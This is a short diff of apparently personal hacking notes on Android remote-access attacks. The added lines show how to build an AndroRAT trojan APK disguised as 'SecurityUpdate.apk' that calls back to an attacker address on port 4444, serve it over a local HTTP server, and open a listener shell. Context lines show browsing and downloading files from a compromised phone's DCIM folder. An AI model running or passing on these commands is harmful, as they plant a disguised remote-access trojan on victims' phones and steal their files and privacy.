@@ -60,3 +60,14 @@ ps (processes)
 cd DCIM
 download .filename
 ls -la
+
+
+CRACK WITH ANDRORAT!
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+cd AndroRAT
+python3 -m http.server 8888
+python3 androRat.py --shell -i 0.0.0.0 -p 4444
+help
+
+Android Analyzers 
+www.sisil.eu/apk-tool
